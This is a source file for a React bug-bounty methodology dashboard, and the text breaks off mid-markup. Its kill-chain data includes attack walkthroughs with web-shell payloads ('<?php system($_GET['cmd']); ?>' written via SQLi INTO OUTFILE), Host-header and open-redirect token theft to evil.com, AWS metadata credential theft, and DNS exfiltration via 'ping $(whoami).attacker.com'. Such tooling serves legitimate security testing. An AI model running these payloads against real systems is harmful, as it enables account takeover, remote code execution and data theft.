import { useState, useEffect, useMemo } from "react";
import { INTEL_DATABASE, INTEL_CATEGORIES } from "../data/intelDatabase";
import { generateScenarioWithAI } from "../services/geminiService";
import AttackDecisionEngine from "./AttackDecisionEngine";
import TrafficAnalyzer from "./TrafficAnalyzer";
import SmartWordlistBuilder from "./SmartWordlistBuilder";
import ReconIngestor from "./ReconIngestor";

const DecisionNode = ({ node, depth = 0 }) => {
  if (!node) return null;
  const paddingLeft = depth * 20;

  return (
    <div style={{ marginLeft: depth > 0 ? "20px" : "0", borderLeft: depth > 0 ? "2px solid var(--color-border)" : "none", paddingLeft: depth > 0 ? "16px" : "0", marginTop: depth > 0 ? "12px" : "0" }}>
      {node.question && (
        <div style={{ fontWeight: 600, color: "var(--color-text-heading)", marginBottom: "8px", display: "flex", alignItems: "flex-start", gap: "8px" }}>
          <span style={{ color: "var(--color-blue)" }}>?</span>
          <span>{node.question}</span>
        </div>
      )}
      
      {node.yes && (
        <div style={{ marginBottom: "12px" }}>
          <div style={{ display: "flex", alignItems: "flex-start", gap: "8px", marginBottom: "4px" }}>
            <span style={{ background: "rgba(16, 185, 129, 0.1)", color: "var(--color-green)", padding: "2px 6px", borderRadius: "4px", fontSize: "11px", fontWeight: 700, marginTop: "2px" }}>YES</span>
            <span style={{ fontSize: "14px", lineHeight: "1.5" }}>{node.yes.action}</span>
          </div>
          {node.yes.next && <DecisionNode node={node.yes.next} depth={depth + 1} />}
        </div>
      )}

      {node.no && (
        <div>
          <div style={{ display: "flex", alignItems: "flex-start", gap: "8px", marginBottom: "4px" }}>
            <span style={{ background: "rgba(239, 68, 68, 0.1)", color: "var(--color-red)", padding: "2px 6px", borderRadius: "4px", fontSize: "11px", fontWeight: 700, marginTop: "2px" }}>NO</span>
            <span style={{ fontSize: "14px", lineHeight: "1.5" }}>{node.no.action}</span>
          </div>
          {node.no.next && <DecisionNode node={node.no.next} depth={depth + 1} />}
        </div>
      )}
    </div>
  );
};

// --- Kill Chain Data ---
const VULNS = [
  "Open Redirect",
  "CORS Misconfiguration",
  "Self-XSS",
  "CSRF",
  "HTTP Parameter Pollution",
  "Password Reset Flaw",
  "OAuth Authorization",
  "SSRF Filter",
  "XSS",
  "IDOR",
  "LFI",
  "File Upload",
  "SQLi",
  "SSTI",
  "Command Injection",
  "Cache Deception",
  "Host Header Injection"
];

const CHAINS = [
  {
    requires: ["CORS Misconfiguration", "CSRF"],
    title: "CORS Token Extraction to CSRF Bypass",
    impact: "High / Critical",
    steps: [
      "1. Host a malicious HTML page on your server.",
      "2. Use the CORS misconfiguration to make a cross-origin XMLHTTPRequest to the target's CSRF token endpoint.",
      "3. Read the CSRF token from the response text.",
      "4. Immediately use that stolen token to construct a forged state-changing request (e.g. changing the victim's email)."
    ]
  },
  {
    requires: ["Self-XSS", "CSRF"],
    title: "Login CSRF to Stored XSS Execution",
    impact: "Medium / High",
    steps: [
      "1. Plant your Self-XSS payload inside your own account profile.",
      "2. Discover a Login CSRF vulnerability (the ability to force a victim to log into your account without them knowing).",
      "3. The victim visits your malicious page, is silently logged into your account via CSRF.",
      "4. The victim is redirected to the profile page, executing the Self-XSS payload in their browser context."
    ]
  },
  {
    requires: ["Open Redirect", "OAuth Authorization"],
    title: "OAuth Token Theft via Open Redirect",
    impact: "Critical (Full ATO)",
    steps: [
      "1. Find an Open Redirect on the target domain (e.g., `https://target.com/login?redirect=https://evil.com`).",
      "2. Initiate the OAuth flow, but set the `redirect_uri` to the Open Redirect endpoint.",
      "3. The victim authorizes the app.",
      "4. The OAuth provider sends the Authorization Code to the Open Redirect endpoint, which forwards the victim (and the code in the URL) to your malicious server.",
      "5. Use the stolen code to log into the victim's account."
    ]
  },
  {
    requires: ["HTTP Parameter Pollution", "Password Reset Flaw"],
    title: "Password Reset Token Hijacking via HPP",
    impact: "Critical (Full ATO)",
    steps: [
      "1. Go to the Forgot Password page.",
      "2. Intercept the request and supply two email parameters: `email=victim@a.com&email=attacker@a.com`.",
      "3. The backend logic might validate the first email (victim) to generate the token, but the email dispatch service might use the second email (attacker) to send the token.",
      "4. Check your inbox for the victim's password reset token."
    ]
  },
  {
    requires: ["Open Redirect", "SSRF Filter"],
    title: "SSRF Filter Bypass via Redirection",
    impact: "Critical",
    steps: [
      "1. The target has a feature that fetches external URLs (e.g. a webhook or image downloader) but blocks internal IPs (127.0.0.1).",
      "2. You found an Open Redirect on the target (e.g., `target.com/redirect?url=http://169.254.169.254`).",
      "3. Pass the Open Redirect URL to the SSRF feature.",
      "4. The SSRF feature validates `target.com` (which is allowed) and makes the request. It follows the redirect internally to the blocked AWS Metadata IP."
    ]
  },
  {
    requires: ["File Upload", "LFI"],
    title: "LFI to RCE via Malicious Image Upload",
    impact: "Critical (RCE)",
    steps: [
      "1. Find an avatar or file upload feature that allows image uploads.",
      "2. Create a malicious image file containing a PHP payload embedded in the EXIF data or trailing bytes (e.g., `<?php system($_GET['cmd']); ?>`).",
      "3. Upload the image and capture the saved file path (e.g., `/uploads/images/avatar_123.jpg`).",
      "4. Find an LFI vulnerability elsewhere on the site (e.g., `?page=../../uploads/images/avatar_123.jpg`).",
      "5. Include the image. The PHP engine will execute the embedded code, giving you Remote Code Execution."
    ]
  },
  {
    requires: ["XSS", "IDOR"],
    title: "XSS to Admin Account Takeover via IDOR",
    impact: "Critical (Admin ATO)",
    steps: [
      "1. Find an IDOR vulnerability that allows updating user passwords or roles, but it requires knowing the victim's CSRF token or session ID.",
      "2. Find a Stored XSS vulnerability on a page the Admin is likely to visit (e.g., support ticket, profile bio).",
      "3. Craft an XSS payload that silently fetches the Admin's CSRF token, and uses it to send an AJAX request exploiting the IDOR (e.g., changing the Admin's password to 'hacked123').",
      "4. Wait for the Admin to view your payload. Their account is compromised."
    ]
  },
  {
    requires: ["Cache Deception", "IDOR"],
    title: "Mass Account Takeover via Web Cache Deception",
    impact: "Critical",
    steps: [
      "1. Find a sensitive endpoint (e.g., `/api/user/profile`) that does not enforce file extensions.",
      "2. The CDN is configured to aggressively cache static files (e.g., `.css`, `.js`, `.jpg`).",
      "3. Send a link to a victim: `https://target.com/api/user/profile/nonexistent.jpg`.",
      "4. The victim clicks it. The server ignores `/nonexistent.jpg` and returns their sensitive profile JSON.",
      "5. The CDN sees `.jpg` and caches the victim's profile data globally.",
      "6. You visit the exact same link and the CDN serves you the victim's cached session token/PII."
    ]
  },
  {
    requires: ["Host Header Injection", "Password Reset Flaw"],
    title: "Password Reset Poisoning via Host Header",
    impact: "Critical (Full ATO)",
    steps: [
      "1. Initiate a password reset for the victim's email address.",
      "2. Intercept the POST request.",
      "3. Modify the `Host` header to point to your attacker server (e.g., `Host: evil.com`).",
      "4. If the backend relies on the Host header to dynamically construct the reset link, it will send an email to the victim with a link like: `https://evil.com/reset?token=12345`.",
      "5. The victim clicks the link, sending their secret token directly to your server."
    ]
  },
  {
    requires: ["SQLi", "File Upload"],
    title: "SQLi to Web Shell via INTO OUTFILE",
    impact: "Critical (RCE)",
    steps: [
      "1. Find a SQL Injection vulnerability (must be a DBA/root user).",
      "2. Find a directory on the web server that is writable (e.g., by testing file upload features and noting the `/uploads/` path).",
      "3. Use the SQL injection to write a webshell directly to the disk: `UNION SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/uploads/shell.php'--`",
      "4. Access `https://target.com/uploads/shell.php?cmd=id` to execute arbitrary commands."
    ]
  },
  {
    requires: ["SSTI", "SSRF Filter"],
    title: "SSTI to Cloud Metadata Extraction",
    impact: "Critical (Cloud Compromise)",
    steps: [
      "1. Find a Server-Side Template Injection (SSTI) vulnerability in an email template or PDF generator.",
      "2. The server blocks standard RCE payloads (like `os.popen`).",
      "3. Use the SSTI to force the template engine itself to make an HTTP request (SSRF) to the internal AWS Metadata IP (`http://169.254.169.254/latest/meta-data/iam/security-credentials/`).",
      "4. Render the output into the template. You now possess the temporary AWS IAM keys for the EC2 instance."
    ]
  },
  {
    requires: ["Command Injection", "Open Redirect"],
    title: "Blind Command Injection Exfiltration via DNS",
    impact: "Critical (RCE)",
    steps: [
      "1. Find a Blind Command Injection vulnerability (the command executes, but you cannot see the output).",
      "2. Traditional HTTP callbacks (e.g., `curl`) are blocked by an egress firewall.",
      "3. Craft a payload that executes the command, base64 encodes the output, and appends it as a subdomain to an attacker-controlled DNS server (e.g., `ping $(whoami).attacker.com`).",
      "4. Monitor your DNS server logs to capture the executed command output."
    ]
  }
];

const COLUMNS = ["Discovered", "Fingerprinting", "Active Attacking", "Exploited"];

export default function MethodologyWorkflow({ categories }) {
  const [activeTab, setActiveTab] = useState("traffic-analyzer"); // traffic-analyzer, decision-engine, intel, asset-board, kill-chain

  // --- Intel Engine State ---
  const [intelSearchInput, setIntelSearchInput] = useState("");
  const [intelSearch, setIntelSearch] = useState("");
  const [intelCategory, setIntelCategory] = useState("all");

  useEffect(() => {
    const handler = setTimeout(() => {
      setIntelSearch(intelSearchInput);
    }, 200);
    return () => clearTimeout(handler);
  }, [intelSearchInput]);
  const [expandedIntel, setExpandedIntel] = useState(null);
  const [apiKey, setApiKey] = useState(() => localStorage.getItem("bugbounty_gemini_key") || "");
  const [customScenarios, setCustomScenarios] = useState(() => {
    const saved = localStorage.getItem("bugbounty_custom_intel");
    return saved ? JSON.parse(saved) : [];
  });
  const [isGenerating, setIsGenerating] = useState(false);
  const [showApiKeySettings, setShowApiKeySettings] = useState(false);

  useEffect(() => {
    localStorage.setItem("bugbounty_gemini_key", apiKey);
  }, [apiKey]);

  useEffect(() => {
    localStorage.setItem("bugbounty_custom_intel", JSON.stringify(customScenarios));
  }, [customScenarios]);

  const filteredIntel = useMemo(() => {
    const allIntel = [...INTEL_DATABASE, ...customScenarios];
    return allIntel.filter(item => {
      const matchesCategory = intelCategory === "all" || item.category === intelCategory;
      const matchesSearch = intelSearch === "" || 
        item.finding.toLowerCase().includes(intelSearch.toLowerCase()) ||
        item.attacksUnlocked.some(a => a.toLowerCase().includes(intelSearch.toLowerCase()));
      return matchesCategory && matchesSearch;
    });
  }, [intelSearch, intelCategory, customScenarios]);

  const handleGenerateAI = async () => {
    if (!apiKey) {
      alert("Please enter your Gemini API key first.");
      setShowApiKeySettings(true);
      return;
    }
    setIsGenerating(true);
    try {
      const newScenario = await generateScenarioWithAI(apiKey, intelSearch);
      setCustomScenarios([newScenario, ...customScenarios]);
      setExpandedIntel(newScenario.id); // auto-expand the new one
      setIntelSearchInput(""); // clear search to show it
    } catch (err) {
      alert("AI Generation failed: " + err.message);
    } finally {
      setIsGenerating(false);
    }
  };

  // --- Asset Board State ---
  const [assets, setAssets] = useState(() => {
    const saved = localStorage.getItem("bugbounty_assets");
    if (saved) {
      try { return JSON.parse(saved); } catch (e) { return []; }
    }
    return [
      { id: Date.now().toString(), name: "api.example.com", column: "Discovered", notes: "Found via subfinder." }
    ];
  });

  useEffect(() => {
    localStorage.setItem("bugbounty_assets", JSON.stringify(assets));
  }, [assets]);

  const [newAsset, setNewAsset] = useState("");
  const [activeAsset, setActiveAsset] = useState(null);

  const handleAddAsset = (e) => {
    e.preventDefault();
    if (!newAsset.trim()) return;
    const asset = {
      id: Date.now().toString(),
      name: newAsset.trim(),
      column: "Discovered",
      notes: ""
    };
    setAssets([...assets, asset]);
    setNewAsset("");
  };

  const trackExternalAsset = (hostName) => {
    const exists = assets.find(a => a.name === hostName);
    if (!exists) {
      setAssets(prev => [...prev, {
        id: Date.now().toString() + Math.random().toString(),
        name: hostName,
        column: "Discovered",
        notes: "Imported from Recon Ingestor"
      }]);
      alert(`Asset ${hostName} tracked successfully!`);
    } else {
      alert(`Asset ${hostName} is already being tracked.`);
    }
  };

  const moveAsset = (id, direction) => {
    setAssets(prev => prev.map(asset => {
      if (asset.id === id) {
        const currentIndex = COLUMNS.indexOf(asset.column);
        let newIndex = currentIndex;
        if (direction === "left" && currentIndex > 0) newIndex = currentIndex - 1;
        if (direction === "right" && currentIndex < COLUMNS.length - 1) newIndex = currentIndex + 1;
        return { ...asset, column: COLUMNS[newIndex] };
      }
      return asset;
    }));
  };

  const deleteAsset = (id) => {
    if (window.confirm("Delete this asset?")) {
      setAssets(prev => prev.filter(a => a.id !== id));
      if (activeAsset && activeAsset.id === id) setActiveAsset(null);
    }
  };

  const updateAssetNotes = (id, notes) => {
    setAssets(prev => prev.map(asset => asset.id === id ? { ...asset, notes } : asset));
    if (activeAsset && activeAsset.id === id) {
      setActiveAsset({ ...activeAsset, notes });
    }
  };

  // --- Kill-Chain State ---
  const [selectedVulns, setSelectedVulns] = useState([]);

  const toggleVuln = (v) => {
    if (selectedVulns.includes(v)) {
      setSelectedVulns(selectedVulns.filter(x => x !== v));
    } else {
      setSelectedVulns([...selectedVulns, v]);
    }
  };

  const synthesizedChains = useMemo(() => {
    return CHAINS.filter(chain => 
      chain.requires.every(req => selectedVulns.includes(req))
    );
  }, [selectedVulns]);

  // --- Whitebox Hypothesis State ---
  const [rawRequest, setRawRequest] = useState("POST /api/v1/user/update HTTP/1.1\nHost: api.example.com\nAuthorization: Bearer eyJhb...\nContent-Type: application/json\n\n{\"email\":\"attacker@evil.com\"}");
  const [hypothesis, setHypothesis] = useState(null);

  const generateHypothesis = () => {
    let type = "unknown";
    if (rawRequest.includes("application/json")) type = "json_api";
    if (rawRequest.includes("?id=")) type = "idor_api";
    if (rawRequest.includes("Content-Type: multipart/form-data")) type = "file_upload";

    if (type === "json_api") {
      setHypothesis({
        language: "Node.js (Express) OR Ruby on Rails",
        code: `app.post('/api/v1/user/update', async (req, res) => {
  const userId = req.user.id;
  
  // 🚨 DEVELOPER ASSUMPTION: req.body only contains safe fields
  // VULNERABILITY: Mass Assignment / Prototype Pollution
  const updatedUser = await User.update(userId, req.body);
  
  res.json(updatedUser);
});`,
        advice: "The developer likely passed the raw JSON body directly into the ORM update method. Try adding `\"role\":\"admin\"` or `\"is_admin\":true` to the JSON payload to elevate privileges."
      });
    } else if (type === "idor_api") {
      setHypothesis({
        language: "Python (Django) OR Java (Spring)",
        code: `def get_document(request):
  # 🚨 DEVELOPER ASSUMPTION: The ID is an unguessable UUID
  # VULNERABILITY: IDOR (Insecure Direct Object Reference)
  doc_id = request.GET.get('id')
  
  document = Database.find(doc_id)
  return JsonResponse(document)`,
        advice: "The backend is fetching records blindly by ID without verifying if the current session owns that ID. Try modifying the ID to access other users' data."
      });
    } else {
      setHypothesis({
        language: "PHP / General Backend",
        code: `<?php
// 🚨 DEVELOPER ASSUMPTION: Input is sanitized by WAF
// VULNERABILITY: Blind SQLi / Command Injection
$input = $_REQUEST['data'];
$db->query("SELECT * FROM table WHERE data = '$input'");
?>`,
        advice: "Generic endpoint detected. Test for Blind SQL Injection by appending `WAITFOR DELAY '0:0:5'` or Command Injection via `; sleep 5`."
      });
    }
  };

  return (
    <div className="sandbox-container content-area" style={{ display: "flex", flexDirection: "column", height: "100%", overflow: "hidden" }}>
      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "20px", flexWrap: "wrap", gap: "12px", flexShrink: 0 }}>
        <h1 className="dashboard-title" style={{ margin: 0 }}>📋 Advanced & unique features</h1>
        
        <div className="dashboard-tabs" style={{ marginBottom: 0, borderBottom: "none", paddingBottom: 0 }}>
          <button 
            className={`dashboard-tab ${activeTab === "traffic-analyzer" ? "active" : ""}`} 
            onClick={() => setActiveTab("traffic-analyzer")}
          >
            🚦 Traffic Analyzer
          </button>
          <button 
            className={`dashboard-tab ${activeTab === "recon" ? "active" : ""}`} 
            onClick={() => setActiveTab("recon")}
          >
            📡 Recon Ingestor
          </button>

          <button 
            className={`dashboard-tab ${activeTab === "smart-wordlist" ? "active" : ""}`} 
            onClick={() => setActiveTab("smart-wordlist")}
          >
            📑 Smart wordlist builder
          </button>
          <button 
            className={`dashboard-tab ${activeTab === "decision-engine" ? "active" : ""}`} 
            onClick={() => setActiveTab("decision-engine")}
          >
            ⚡ Decision Engine
          </button>
          <button 
            className={`dashboard-tab ${activeTab === "intel" ? "active" : ""}`} 
            onClick={() => setActiveTab("intel")}
          >
            🧠 Intel Engine
          </button>
          <button 
            className={`dashboard-tab ${activeTab === "asset-board" ? "active" : ""}`} 
            onClick={() => setActiveTab("asset-board")}
          >
            Asset Board
          </button>
          <button 
            className={`dashboard-tab ${activeTab === "kill-chain" ? "active" : ""}`} 
            onClick={() => setActiveTab("kill-chain")}
          >
            Kill-Chain
          </button>

        </div>
      </div>
      
      {activeTab === "traffic-analyzer" && (
        <div style={{ overflowY: "auto", flex: 1, paddingRight: "4px" }}>
          <TrafficAnalyzer />
        </div>
      )}

      {activeTab === "recon" && (
        <div style={{ overflowY: "auto", flex: 1, paddingRight: "4px" }}>
          <ReconIngestor onTrackAsset={trackExternalAsset} />
        </div>
      )}



      {activeTab === "smart-wordlist" && (
        <div style={{ overflowY: "auto", flex: 1, paddingRight: "4px" }}>
          <SmartWordlistBuilder />
        </div>
      )}

      {activeTab === "decision-engine" && (
        <div style={{ overflowY: "auto", flex: 1, paddingRight: "4px" }}>
          <AttackDecisionEngine categories={categories} />
        </div>
      )}

      {activeTab === "intel" && (
        <div style={{ display: "flex", flexDirection: "column", gap: "16px", overflowY: "auto", flex: 1, paddingRight: "4px" }}>
          
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
            <p style={{ color: "var(--color-text-muted)", margin: 0, fontSize: "14px" }}>
              Search scenarios or use Gemini AI to generate new ones on the fly.
            </p>
            <button onClick={() => setShowApiKeySettings(!showApiKeySettings)} style={{ background: "none", border: "none", color: "var(--color-blue)", cursor: "pointer", fontSize: "13px", textDecoration: "underline" }}>
              {showApiKeySettings ? "Close Settings" : "⚙️ AI Settings"}
            </button>
          </div>

          {showApiKeySettings && (
            <div style={{ background: "var(--color-bg-secondary)", padding: "16px", borderRadius: "8px", border: "1px solid var(--color-border)", display: "flex", flexDirection: "column", gap: "8px" }}>
              <label style={{ fontSize: "13px", fontWeight: 600 }}>Gemini API Key</label>
              <input 
                type="password" 
                className="vault-input" 
                placeholder="AIzaSy..." 
                value={apiKey} 
                onChange={(e) => setApiKey(e.target.value)} 
                style={{ width: "100%", maxWidth: "400px" }}
              />
              <span style={{ fontSize: "12px", color: "var(--color-text-faint)" }}>Your key is saved locally in your browser and never sent to our servers.</span>
            </div>
          )}

          {/* Search Bar */}
          <div style={{ display: "flex", gap: "8px" }}>
            <input 
              type="text"
              className="vault-input"
              placeholder="🔍 What did you find? (e.g. Jenkins server, exposed git)"
              value={intelSearchInput}
              onChange={(e) => setIntelSearchInput(e.target.value)}
              style={{ padding: "10px 14px", fontSize: "14px", flexGrow: 1 }}
            />
          </div>

          {/* Category Pills */}
          <div style={{ display: "flex", flexWrap: "wrap", gap: "8px" }}>
            <button onClick={() => setIntelCategory("all")} style={{ padding: "5px 12px", borderRadius: "16px", border: `1px solid ${intelCategory === "all" ? "var(--color-blue)" : "var(--color-border)"}`, background: intelCategory === "all" ? "var(--color-blue)" : "var(--color-bg-secondary)", color: intelCategory === "all" ? "white" : "var(--color-text)", cursor: "pointer", fontWeight: 600, fontSize: "13px" }}>All</button>
            {INTEL_CATEGORIES.map(cat => (
              <button key={cat.id} onClick={() => setIntelCategory(cat.id)} style={{ padding: "5px 12px", borderRadius: "16px", border: `1px solid ${intelCategory === cat.id ? cat.color : "var(--color-border)"}`, background: intelCategory === cat.id ? cat.color : "var(--color-bg-secondary)", color: intelCategory === cat.id ? "white" : "var(--color-text)", cursor: "pointer", fontWeight: 600, fontSize: "13px" }}>{cat.label}</button>
            ))}
          </div>

          {/* Scenario Cards */}
          <div style={{ display: "flex", flexDirection: "column", gap: "12px" }}>
            {filteredIntel.length === 0 ? (
              <div className="empty-state" style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: "16px", padding: "40px" }}>
                <div>No matching scenarios found for "{intelSearch}".</div>
                {intelSearch.length > 3 && (
                  <button 
                    className="btn-primary" 
                    onClick={handleGenerateAI}
                    disabled={isGenerating}
                    style={{ background: isGenerating ? "var(--color-bg-secondary)" : "var(--color-blue)", color: isGenerating ? "var(--color-text)" : "white", border: "1px solid var(--color-border)" }}
                  >
                    {isGenerating ? "🤖 Generating Intelligence..." : "✨ Ask AI to Generate Scenario"}
                  </button>
                )}
              </div>
            ) : (
              filteredIntel.map(item => {
                const isExpanded = expandedIntel === item.id;
                const cat = INTEL_CATEGORIES.find(c => c.id === item.category);
                return (
                  <div key={item.id} style={{ background: "var(--color-bg-secondary)", border: "1px solid var(--color-border)", borderRadius: "8px", overflow: "hidden" }}>
                    {/* Header - always visible */}
                    <div 
                      onClick={() => setExpandedIntel(isExpanded ? null : item.id)}
                      style={{ padding: "14px 18px", cursor: "pointer", display: "flex", justifyContent: "space-between", alignItems: "center" }}
                    >
                      <div style={{ display: "flex", alignItems: "center", gap: "12px" }}>
                        <span style={{ background: cat?.color || "#666", color: "white", padding: "2px 8px", borderRadius: "4px", fontSize: "11px", fontWeight: 700 }}>{cat?.label}</span>
                        <span style={{ fontWeight: 600, fontSize: "15px" }}>{item.finding}</span>
                      </div>
                      <span style={{ color: "var(--color-text-faint)", fontSize: "14px" }}>{isExpanded ? "▲" : "▼"}</span>
                    </div>

                    {/* Expanded Body */}
                    {isExpanded && (
                      <div style={{ padding: "0 18px 18px 18px", display: "flex", flexDirection: "column", gap: "20px", borderTop: "1px solid var(--color-border)" }}>
                        {/* Why it matters */}
                        <div style={{ marginTop: "16px" }}>
                          <div style={{ fontSize: "12px", fontWeight: 700, color: "var(--color-text-faint)", textTransform: "uppercase", marginBottom: "6px" }}>💡 Why This Matters</div>
                          <div style={{ fontSize: "14px", lineHeight: "1.5", color: "var(--color-text)" }}>{item.why}</div>
                        </div>

                        {/* What To Do Now */}
                        <div>
                          <div style={{ fontSize: "12px", fontWeight: 700, color: "var(--color-text-faint)", textTransform: "uppercase", marginBottom: "8px" }}>⚡ What To Do Right Now</div>
                          <ul style={{ margin: 0, paddingLeft: "18px", fontSize: "14px", lineHeight: "1.7" }}>
                            {item.whatToDoNow.map((step, i) => <li key={i} style={{ marginBottom: "4px" }}>{step}</li>)}
                          </ul>
                        </div>

                        {/* Decision Tree */}
                        <div>
                          <div style={{ fontSize: "12px", fontWeight: 700, color: "var(--color-text-faint)", textTransform: "uppercase", marginBottom: "8px" }}>🌳 Decision Tree</div>
                          <DecisionNode node={item.decisionTree} depth={0} />
                        </div>

                        {/* Attacks Unlocked + Connects To */}
                        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "16px" }}>
                          <div>
                            <div style={{ fontSize: "12px", fontWeight: 700, color: "var(--color-red)", textTransform: "uppercase", marginBottom: "8px" }}>🎯 Attacks Unlocked</div>
                            <div style={{ display: "flex", flexWrap: "wrap", gap: "6px" }}>
                              {item.attacksUnlocked.map((a, i) => <span key={i} style={{ background: "rgba(239, 68, 68, 0.1)", color: "var(--color-red)", padding: "3px 8px", borderRadius: "4px", fontSize: "12px", fontWeight: 600 }}>{a}</span>)}
                            </div>
                          </div>
                          <div>
                            <div style={{ fontSize: "12px", fontWeight: 700, color: "var(--color-blue)", textTransform: "uppercase", marginBottom: "8px" }}>🔗 Connects To</div>
                            <div style={{ display: "flex", flexWrap: "wrap", gap: "6px" }}>
                              {item.connectsTo.map((c, i) => <span key={i} style={{ background: "rgba(59, 130, 246, 0.1)", color: "var(--color-blue)", padding: "3px 8px", borderRadius: "4px", fontSize: "12px", fontWeight: 600 }}>{c}</span>)}
                            </div>
                          </div>
                        </div>
                      </div>
                    )}
                  </div>
                );
              })
            )}
          </div>
        </div>
      )}

      {activeTab === "asset-board" && (
        <>
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "24px", flexShrink: 0 }}>
            <p style={{ color: "var(--color-text-muted)", margin: 0 }}>
              A Kanban-style methodology. Drag discovered assets through the attack lifecycle.
            </p>
            <form onSubmit={handleAddAsset} style={{ display: "flex", gap: "8px" }}>
              <input 
                type="text" 
                className="vault-input" 
                placeholder="Add asset (e.g. admin.target.com)" 
                value={newAsset} 
                onChange={(e) => setNewAsset(e.target.value)} 
                style={{ width: "250px", padding: "6px 12px" }}
              />
              <button type="submit" className="btn-primary" style={{ padding: "6px 12px" }}>Add Asset</button>
            </form>
          </div>

          {/* Kanban Board Layout */}
          <div style={{ display: "flex", gap: "16px", flexGrow: 1, overflowX: "auto", paddingBottom: "16px" }}>
            {COLUMNS.map((columnName, colIdx) => {
              const columnAssets = assets.filter(a => a.column === columnName);
              return (
                <div key={columnName} style={{ 
                  flex: "1", minWidth: "280px", background: "var(--color-bg-secondary)", borderRadius: "8px", 
                  border: "1px solid var(--color-border)", display: "flex", flexDirection: "column", height: "100%"
                }}>
                  <div style={{ 
                    padding: "12px 16px", borderBottom: "1px solid var(--color-border)", background: "var(--color-bg)",
                    display: "flex", justifyContent: "space-between", alignItems: "center", fontWeight: 600,
                    color: "var(--color-text-heading)", borderTopLeftRadius: "8px", borderTopRightRadius: "8px"
                  }}>
                    <span>{columnName}</span>
                    <span style={{ fontSize: "12px", background: "var(--color-border)", padding: "2px 8px", borderRadius: "12px" }}>{columnAssets.length}</span>
                  </div>
                  <div style={{ padding: "16px", display: "flex", flexDirection: "column", gap: "12px", overflowY: "auto", flexGrow: 1 }}>
                    {columnAssets.map(asset => (
                      <div key={asset.id} style={{ 
                        background: "var(--color-bg)", border: "1px solid var(--color-border)", borderRadius: "6px", 
                        padding: "12px", boxShadow: "0 2px 4px rgba(0,0,0,0.05)"
                      }}>
                        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", marginBottom: "8px" }}>
                          <div 
                            style={{ fontWeight: 600, color: "var(--color-blue)", wordBreak: "break-all", cursor: "pointer", flex: 1 }}
                            onClick={() => setActiveAsset(asset)}
                          >
                            {asset.name}
                          </div>
                          <button onClick={() => deleteAsset(asset.id)} style={{ background: "none", border: "none", color: "var(--color-red)", cursor: "pointer", opacity: 0.7, padding: "0 4px" }}>×</button>
                        </div>
                        <div style={{ fontSize: "12px", color: "var(--color-text-muted)", marginBottom: "12px", display: "-webkit-box", WebkitLineClamp: 2, WebkitBoxOrient: "vertical", overflow: "hidden" }}>
                          {asset.notes || "No notes yet..."}
                        </div>
                        <div style={{ display: "flex", justifyContent: "space-between", borderTop: "1px solid var(--color-border)", paddingTop: "8px" }}>
                          <button onClick={() => moveAsset(asset.id, "left")} disabled={colIdx === 0} style={{ background: "none", border: "none", cursor: colIdx === 0 ? "not-allowed" : "pointer", opacity: colIdx === 0 ? 0.3 : 1 }}>←</button>
                          <button onClick={() => setActiveAsset(asset)} style={{ fontSize: "12px", background: "none", border: "none", color: "var(--color-text)", cursor: "pointer", textDecoration: "underline" }}>Open Notepad</button>
                          <button onClick={() => moveAsset(asset.id, "right")} disabled={colIdx === COLUMNS.length - 1} style={{ background: "none", border: "none", cursor: colIdx === COLUMNS.length - 1 ? "not-allowed" : "pointer", opacity: colIdx === COLUMNS.length - 1 ? 0.3 : 1 }}>→</button>
                        </div>
                      </div>
                    ))}
                    {columnAssets.length === 0 && (
                      <div style={{ textAlign: "center", padding: "20px 0", color: "var(--color-text-faint)", fontSize: "13px" }}>Drop assets here</div>
                    )}
                  </div>
                </div>
              );
            })}
          </div>
        </>
      )}

      {activeTab === "kill-chain" && (
        <div style={{ overflowY: "auto", paddingRight: "8px" }}>
          <p style={{ color: "var(--color-text-muted)", marginBottom: "24px" }}>
            Select the low-severity vulnerabilities you have found. The engine will mathematically synthesize them into Critical Exploitation Chains.
          </p>

          <div style={{ display: "flex", flexWrap: "wrap", gap: "12px", marginBottom: "32px" }}>
            {VULNS.map(v => (
              <button
                key={v}
                onClick={() => toggleVuln(v)}
                style={{
                  padding: "8px 16px",
                  borderRadius: "20px",
                  border: `2px solid ${selectedVulns.includes(v) ? "var(--color-blue)" : "var(--color-border)"}`,
                  background: selectedVulns.includes(v) ? "rgba(37, 99, 235, 0.1)" : "var(--color-bg-secondary)",
                  color: selectedVulns.includes(v) ? "var(--color-blue)" : "var(--color-text)",
                  fontWeight: 600,
                  cursor: "pointer",
                  transition: "all 0.2s"
                }}
              >
                {selectedVulns.includes(v) ? "✓ " : "+ "}{v}
              </button>
            ))}
          </div>

          <div style={{ borderTop: "1px solid var(--color-border)", paddingTop: "24px" }}>
            <h3 style={{ marginTop: 0, marginBottom: "16px", fontSize: "18px" }}>🧬 Synthesized Attack Chains ({synthesizedChains.length})</h3>
            
            {synthesizedChains.length === 0 ? (
              <div className="empty-state">
                Select 2 or more compatible vulnerabilities above to discover hidden attack chains.
              </div>
            ) : (
              <div style={{ display: "flex", flexDirection: "column", gap: "16px" }}>
                {synthesizedChains.map((chain, idx) => (
                  <div key={idx} style={{ background: "var(--color-bg-secondary)", border: "1px solid var(--color-border)", borderRadius: "8px", padding: "20px" }}>
                    <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "12px" }}>
                      <h4 style={{ margin: 0, fontSize: "18px", color: "var(--color-text-heading)" }}>{chain.title}</h4>
                      <span className="waf-badge" style={{ background: "var(--color-red)" }}>{chain.impact}</span>
                    </div>
                    <div style={{ fontSize: "13px", color: "var(--color-blue)", marginBottom: "16px", fontWeight: 600 }}>
                      Requires: {chain.requires.join(" + ")}
                    </div>
                    <ul style={{ margin: 0, paddingLeft: "20px", fontSize: "14px", lineHeight: "1.6" }}>
                      {chain.steps.map((step, sIdx) => <li key={sIdx}>{step}</li>)}
                    </ul>
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>
      )}



      {/* Asset Detail Modal */}
      {activeAsset && (
        <div style={{
          position: "fixed", top: 0, left: 0, right: 0, bottom: 0, 
          background: "rgba(0,0,0,0.6)", display: "flex", justifyContent: "center", alignItems: "center", zIndex: 1000
        }}>
          <div style={{
